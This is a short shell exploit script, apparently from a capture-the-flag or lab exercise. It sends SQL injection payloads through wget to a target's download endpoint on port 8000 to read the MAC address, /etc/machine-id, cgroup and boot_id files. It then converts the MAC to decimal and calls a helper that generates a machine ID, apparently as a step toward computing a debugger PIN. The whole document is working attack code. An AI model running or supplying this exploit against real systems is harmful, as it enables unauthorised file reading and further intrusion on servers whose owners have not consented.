ip=$1
echo "Downloading MAC address"
wget "http://$ip:8000/download?id=%27%20union%20all%20select%20%27file:///sys/class/net/eth0/address%27;%20#" -O data/mac_address
echo "Downloading machine-id"
wget "http://$ip:8000/download?id=%27%20union%20all%20select%20%27file:///etc/machine-id%27;%20#" -O data/machine_id
echo "Downloading cgroup"
wget "http://$ip:8000/download?id=%27%20union%20all%20select%20%27file:///proc/self/cgroup%27;%20#" -O data/cgroup
echo "Downloading boot_id"
wget "http://$ip:8000/download?id=%27%20union%20all%20select%20%27file:///proc/sys/kernel/random/boot_id%27;%20#" -O data/boot_id
echo "Convert mac from hex to dec"

hex_mac=$(sed 's/://g' data/mac_address)
dec_mac=$(printf "%d" 0x$hex_mac)
echo "MAC: $dec_mac"

echo "Generating MachineID"
python custom_init.py